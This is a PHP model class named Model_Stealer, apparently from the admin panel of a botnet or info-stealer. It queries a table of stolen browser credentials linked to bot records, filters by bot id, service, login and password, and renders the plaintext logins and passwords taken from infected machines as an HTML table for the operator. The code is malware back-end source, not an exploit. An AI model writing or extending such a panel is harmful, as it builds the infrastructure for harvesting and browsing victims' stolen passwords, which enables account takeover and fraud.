<?php

require_once 'application/models/accessory_models/PaginationWorker.php';

class Model_Stealer extends Model
{

    public function get_data()
    {

    }

    public function getPasswordsData()
    {
        if (empty($this->request_data['pageSize']) || empty($this->request_data['pageNumber']))
        {
            return NULL;
        }

        $paginationWorker = new PaginationWorker($this->request_data['pageSize'], $this->request_data['pageNumber']);

        $generalFilter = base64_decode($this->request_data['filter']);

        $filters = json_decode(base64_decode($this->request_data['additional_filters']), true);

        if (!empty($generalFilter))
        {
            $paginationWorker->setFilter(
                ' AND 
                    (bots.botid LIKE :filter OR
                    service LIKE :filter OR
                    login LIKE :filter OR
                    browser LIKE :filter OR
                    password LIKE :filter)
                '
                , array(':filter' => $generalFilter));
        } else
        {
            $paginationWorker->setAdditionalFilter($filters, false);
        }

        $passwordsDataSource = $this->getDB()->queryRows(
            'SELECT
                      stealer_passwords.id,bots.botid as botid,service,login,password,browser,bot_id
                    FROM
                      stealer_passwords, bots WHERE (bots.id = stealer_passwords.bot_id)'.$paginationWorker->getFilterText() . $paginationWorker->getOrderBy('stealer_passwords.id', true) . $paginationWorker->getLimit(),
                    $paginationWorker->getFilterValues()
        );

        $totalCount = $this->getDB()->queryValue(
            'SELECT
                      COUNT(stealer_passwords.id)
                    FROM
                      stealer_passwords, bots WHERE (bots.id = stealer_passwords.bot_id)'
            .$paginationWorker->getFilterText() . $paginationWorker->getOrderBy('stealer_passwords.id', true),
            $paginationWorker->getFilterValues());

        $responseData = $paginationWorker->getJsonEncodedData($totalCount, $passwordsDataSource, static function($dataRow) {
            return '
                <tr>
                    <td><a href="/bot?bot_id='.$dataRow['bot_id'].'">'.htmlspecialchars($dataRow['botid']).'</a></td>
                    <td>'.htmlspecialchars($dataRow['service']).'</td>
                    <td>'.htmlspecialchars($dataRow['login']).'</td>
                    <td>'.htmlspecialchars($dataRow['password']).'</td>
                    <td>'.htmlspecialchars($dataRow['browser']).'</td>
                </tr>
            ';
        });

        return $responseData;
    }
}